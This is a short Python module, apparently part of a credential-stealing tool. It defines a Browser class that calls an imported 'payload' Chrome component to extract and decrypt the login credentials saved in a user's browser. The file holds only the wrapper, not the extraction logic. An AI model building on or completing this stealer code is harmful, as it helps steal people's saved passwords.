from payload.browser.chrome import Chrome

class Browser():
    """
    Decrypts Browser login data
    """
    def __init__(self):
        pass
    
    def get_login_credentials(self):
        """
        gets saved logged in credentials in a specific browser
        [eg] chrome, internet explorer, brave, etc.
        """
        chrome = Chrome()
        return chrome.extract_saved_credentials()